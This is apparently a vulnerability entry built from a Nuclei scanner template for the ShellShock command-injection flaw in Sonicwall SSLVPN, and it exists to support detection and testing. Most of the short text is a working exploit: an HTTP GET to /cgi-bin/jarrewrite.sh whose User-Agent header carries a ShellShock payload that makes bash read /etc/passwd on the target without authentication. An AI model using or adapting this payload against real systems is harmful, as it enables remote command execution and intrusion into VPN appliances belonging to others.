# Vulnerability: Sonicwall SSLVPN - Remote Code Execution (ShellShock)
**Classification:** CWE-77
**Source:** Nuclei Template (`sonicwall-sslvpn-shellshock.yaml`)

## Description
Sonicwall SSLVPN contains a 'ShellShock' vulnerability which allows remote unauthenticated attackers to execute arbitrary commands.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /cgi-bin/jarrewrite.sh HTTP/1.1
Host: {{Hostname}}
User-Agent: "() { :; }; echo ; /bin/bash -c 'cat /etc/passwd'"
Accept: */*
```

